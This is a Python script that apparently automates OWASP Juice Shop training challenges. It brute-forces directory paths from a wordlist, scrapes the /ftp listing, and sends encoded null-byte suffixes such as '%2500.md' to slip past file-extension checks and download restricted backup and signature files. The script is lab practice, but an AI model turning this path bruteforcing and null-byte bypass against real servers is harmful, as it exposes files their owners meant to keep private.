"""
This file is to automate the OWASP JUICESHOP TASK
1.EASTER EGG
2.FORGETTEN DEVELOPER Backup
3.MISPLACED SIGNATURE FILE
4.ACCESS LOG  --> NOT solved
-------------------------------------------------
METHODOLOGY:
1. scan the subnet to find ftp or support/logs, using brute force
2.1. query key from the response to get the path
     Keys: estere, package,
2.2. given the hint that the file is in .md, .pdf
3.1. scan the subnet using URL encoding of 00.md, 0.md
     0.pdf, 1.pdf by brute force
"""
import re
from plugins import attack as a
import json
import urllib
from urllib import parse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class access_file():

    def __init__(self):
        #self.url = a.URL+ "/ftp" ## you need to write brute force command to obtain this ftp
        self.juice_session = a.requests.session()

    def generator(self):
        pass

    def parse_html(self, string, subnet, tag):
        print(tag)
        pattern = '<a.*?href="({}/{}.+)".*?>(.*?)</a>'.format(subnet, tag)
        try:
            href = re.findall(pattern, string)
            print(href)
            idx = href[0][0].find('"')
            #print(idx)
            return href[0][0][:idx]
        except:
            print( '{} NOT find, please use other script').format(tag)

    def subnet_scan(self):
        len_dict = {}
        f = open('plugins/common.txt', 'r')
        while True:
            line = f.readline()
            if line:
                payload = a.URL + '/' + line[:-1]
                response = self.juice_session.get(payload)
                len_dict[str(len(json.dumps(response.text)))] = payload
            else:
                break
        return len_dict

    def find_confidential(self,subnet, confidential_tag):
        response = self.juice_session.get(a.URL+'/'+str(subnet))
        print(response.text)
        sub_url = self.parse_html(response.text, subnet, confidential_tag)
        response = self.juice_session.get( a.URL + '/' + str(sub_url))
        #print(response.text) ## This is imporatant, because it reminds us of .md/.pdf
        # encoding of '0.md', '1.md','1.pdf','00.md','000.md' respectively in the below attemping list
        attempting = ['%25%30%2e%6d%64', '%25%31%2e%6d%64', '%25%31%2e%70%64%66','%25%30%30%2e%70%64%66','%2500.md']
        i = 0
        while response.status_code != 200:
            if i == len(attempting):
                break
            i += 1
            response = self.juice_session.get(a.URL + '/' + str(sub_url) + attempting[i])
        # you can also find the encoding of '00.md
        print(response.text)
        print(response.status_code)


    def run(self):
        #subnet_list = [value for value in self.subnet_scan().values()]## using the subnet scan, we found 4 kinds of subnet, and we can open them manually, and in this case, we found that ftp is indeed useful.
        #subnet_list_modify = [i.replace('http://localhost:3000/','') for i in subnet_list]
        #print(subnet_list_modify)
        ## output = ['ver2', 'api', 'rest', 'ftp', 'profile', 'promotion', 'redirect', 'restaurants', 'restore', 'restored', 'restricted', 'robots.txt', 'snippets', 'support/logs']
        self.find_confidential(subnet='ftp',confidential_tag='easter') ## challenge" Easter's egg
        self.find_confidential(subnet='ftp',confidential_tag='package') ## challenge FORGETTEN DEVELOPER Backup
        self.find_confidential(subnet='ftp',confidential_tag='suspicious') ## challenge MISPLACED SIGNATURE FILE
        #self.find_confidential(subnet='support/logs/',confidential_tag='access')



